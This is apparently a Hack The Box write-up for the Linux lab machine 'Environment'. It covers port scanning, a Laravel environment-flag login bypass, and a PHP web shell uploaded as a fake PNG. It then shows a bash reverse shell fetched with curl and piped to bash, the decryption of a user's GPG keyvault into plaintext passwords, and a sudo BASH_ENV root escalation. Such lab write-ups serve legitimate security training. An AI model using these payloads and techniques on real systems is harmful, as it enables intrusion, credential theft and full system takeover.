---
name: Environment
difficulty: medium
os: linux
platform: htb
date: 2025/08/12
releasedDate: 2025-09-01
userFlag: true
rootFlag: true

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/757eeb9b0f530e71875f0219d0d477e4.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.67 -o allPorts
```

```
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
```

We will add `environment.htb` to our `/etc/hosts` file for easier access:

```bash
echo "10.10.11.67 environment.htb" | sudo tee -a /etc/hosts
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p 22,80,8000 -sCV environment.htb -o targeted
```

```
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp   open  http      nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Save the Environment | environment.htb
8000/tcp open  http-alt?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We do a directory scan with `gobuster` to find hidden directories and files on the web server:

```bash
gobuster dir -u http://environment.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t200
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://environment.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2391]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/upload               (Status: 405) [Size: 244852]
/up                   (Status: 200) [Size: 2125]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
/build                (Status: 301) [Size: 169] [--> http://environment.htb/build/]
/mailing              (Status: 405) [Size: 244854]
```

We can force an error on `/login` page and see backend source code. We send a POST `/login` request with an invalid `remember`field:

```bash
POST /login HTTP/1.1
Host: environment.htb
...
email=test%40test.com&password=test&remember=nonboolean
```

This will return a 500 Internal Server Error, which reveals the backend source code:

```php
if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
    $request->session()->regenerate();
    $request->session()->put('user_id', 1);
    return redirect('/management/dashboard');
}
```

## User Exploitation

We can see that environment called `preprod` allows logging in as user with ID 1 without needing a password.

```bash
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
...
email=test%40test.com&password=test&remember=nonboolean
```

Now we are logged in as user `hish`. We get redirected to `/management/dashboard`.

We can change our profile picture, maybe we can upload php code and execute it later.

```
POST /upload HTTP/1.1
Host: environment.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://environment.htb/management/profile
Content-Type: multipart/form-data; boundary=---------------------------26383360799661928062804695699
Origin: http://environment.htb
Content-Length: 224966
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6Ik5xU2NlYUxmQjBDSlA4WDBjOXpqTkE9PSIsInZhbHVlIjoiLy9lREh5RmdYTDVHaUE2QSt2S2tqdGxucW1MbFJod0thMWloakkzWHlOM0p0UG9ZdUJ4WUNLN1NaVDRHZTNuUlRWRzdMZGFlTkRCLzMzSWd3azhCNElQQ0tTNGN6eitBckpYK20yNFBrbWxoMExhYVplaFZiSUFVem9iY2s5VWgiLCJtYWMiOiI4MjAxYzQ3ZDAxNmEzYjIwNjc1MTkxNjA0MzVmOTY2ZmUwNGU4YjdhZDYzOGNkOGMyOGFkNGVjZjI0ZWVkNTQ5IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImMycUZEUFA1NGJNSnJuSkJBUnJlZlE9PSIsInZhbHVlIjoiRkVKQ0J2YTI1bVRRdHo2Zlp2aW9iS2xIUHkyZ2dBN0taMkkwRjZxalRTd0VNQXdVeXZTWDA4dGNtanZpV1RhM3RLWnQwS09wTVB1N3QraE93cW1TRVkzcFZ6NFladEw2MTM4L3dpTk03WVhQZmRBdDJVbGZMSzVraVRESjcrQWQiLCJtYWMiOiIwZmFmMzgxYWE1ZDFiMjJmMjBjZWZiNzAxMzBiMzM0ZDg2MTUzYmIzMWFhMGFmYzQ0ZWViMjNmNTFlNTAxYTc0IiwidGFnIjoiIn0%3D

-----------------------------26383360799661928062804695699
Content-Disposition: form-data; name="_token"

H47WDGCWzq0vOaVzUbuB04tNqNDfl4TF2ZGhXgA5
-----------------------------26383360799661928062804695699
Content-Disposition: form-data; name="upload"; filename="png3.php."
Content-Type: image/png

PNG
...image data...

<?php system($_GET['cmd']);?>

...image data...
-----------------------------26383360799661928062804695699--
```

Now we can access the uploaded file at `http://environment.htb/storage/png3.php` and execute commands using the `cmd` parameter:

```bash
curl "http://environment.htb/storage/files/png3.php?cmd=whoami"
```
```

...image data...
www-data
...image data...

```

We can get a reverse shell using the following commands:


```bash
echo "bash -i >& /dev/tcp/10.10.14.216/443 0>&1" > reverse
python3 -m http.server 80
nc -lvnp 443
```

We can make a GET request to the `png3.php` file to execute the reverse shell command:

```
GET /storage/files/png3.php?cmd=curl+10.10.14.216/reverse|bash HTTP/1.1
Host: environment.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IlRmdHIrait2ZGlucXNvNENjejBzbnc9PSIsInZhbHVlIjoicTIyY2VqQ1V0aVFzbHM0aU5mWEdGZFNiV0lxNXgwMS9zT1Bab3BuSElJY204Mlp1OWhHTkhpRHFPb0pxYnNMR2pOQXVaQzRrOEFYS24zMmZ6dDgrY3E3eXNoQVYrdWJ5MHBtdmk5Wk1saDF6d3IxNXd5QTVSQW5GemhDZDBUWXgiLCJtYWMiOiJkNTY0NzY2ZDJhZTRhM2YxNmJkZTZlYzEwMTQ4ZDU2ZTczZmQxM2FhYmJhNjYxMmU1MjM1MjE4MzZkYzMwZjI2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ik5wNE91YkNPS1VDOFRPMGtsOWpvYmc9PSIsInZhbHVlIjoiclFvVkw3YjQxMStmd1RiV3k0cnFzaDZLakdTRGNNTHVDMUU4MXUzbUhmMUZFREtjNWVWUGRFQVkraHJSMUdyWlA4bmJsTkg1V003cmg1ZmF3Qk5SdFpkcnZ2eDRWSlc1cVIyVm9mRk1LWWZMZDdibmh3cXRLenBBZEUvaEhvSk0iLCJtYWMiOiI3ZWRjYzc5MDBkMThiOTdjM2YyZjA1MDliN2IwYzJmNTU4ZjU5NDM1MmU3MWYxMzE2MmY0YmJjNWEzYzhkZTRjIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
```

This will give us a reverse shell as `www-data`. We can get a persistent shell by using the following commands on the reverse shell:

```bash
script /dev/null -c /bin/bash
CONTROL-Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

Even we are `www-data`, we can see the user flag in the home directory of the user `hish`:
```bash
cat /home/hish/user.txt
```

```
user flag value
```

## Root Exploitation

We find there is a GPG file in the home directory of the user `hish`. So, we try to decrypt it:

```bash
cp -r /home/hish/.gnupg /tmp/.gnupg
cp /home/hish/keyvault.gpg /tmp/keyvault.gpg

chmod 700 /tmp/.gnupg
chmod 600 /tmp/.gnupg/*

gpg --homedir /tmp/.gnupg --decrypt /tmp/keyvault.gpg > /tmp/decrypted.txt
cat /tmp/decrypted.txt
```
```
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

We try to use `marineSPm@ster!!` as password to login via SSH:

```bash
ssh hish@environment.htb
whoami
```
```
hish
```

We check if we can use sudo to run commands as root:

```bash
sudo -l
```
```
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

We see that there is a special option for the user `hish` while using `sudo`: 
- `env_keep+="ENV BASH_ENV"` means that the environment variables `ENV` and `BASH_ENV` are preserved when running commands with `sudo`.

These variables can hold scripts that are executed by the shell when it starts in interactive mode (for `ENV`) or when it starts in non-interactive mode (for `BASH_ENV`).

We can use this to our advantage:
```bash
echo "#!/bin/bash
chmod +s /bin/bash" > /tmp/pwn.sh
chmod +x /tmp/pwn.sh
export BASH_ENV=/tmp/pwn.sh
sudo /usr/bin/systeminfo

/bin/bash -p
whoami
```
```
root
```

We can see that we have a root shell now. We can find the root flag in the root directory:
```bash
cat /root/root.txt
```
```
root flag value
```

## Conclusion
In this writeup, we successfully exploited the target machine by leveraging a misconfiguration in the login system to gain user access, then escalated our privileges to root by exploiting the environment variables preserved during `sudo` execution. We were able to retrieve both user and root flags, completing the challenge.
